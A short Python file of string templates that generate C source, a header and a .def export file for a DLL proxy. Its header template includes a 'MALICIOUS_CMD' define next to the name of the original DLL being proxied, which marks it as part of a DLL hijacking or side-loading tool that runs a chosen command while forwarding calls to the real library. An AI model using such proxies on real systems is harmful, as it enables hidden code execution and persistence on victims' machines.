#!/usr/bin/python3

# user.h
USER_H = '''#ifndef USER_H
#define USER_H

#define %(BITNESS)s
#define MALICIOUS_CMD "%(MALICIOUS_CMD)s"
#define PROXIED_DLL "%(ORIG_NAME)s"

#endif'''

# user.c
USER_C = '''#include "dllmain.h"
#include "user.h"

#include <stdlib.h>
#include <stdio.h>
#include <libloaderapi.h>
#include <memoryapi.h>

char no_optim = 0;
void __declspec(noinline) fakefunc(char i) { no_optim = i;  return; }

// Entries start here
%(FUNCTIONS)s


// IAT starts here
PROXY_IAT_ENTRY iat[] = {
%(ENTRIES)s
};

// Code begins here
PROXY_IAT_ENTRY* getIAT() { return iat; };
unsigned int getIATSize() { return sizeof(iat) / sizeof(PROXY_IAT_ENTRY); }'''

# library.def
LIBRARY_DEF = '''LIBRARY DllProxy
EXPORTS
%(EXPORTS)s'''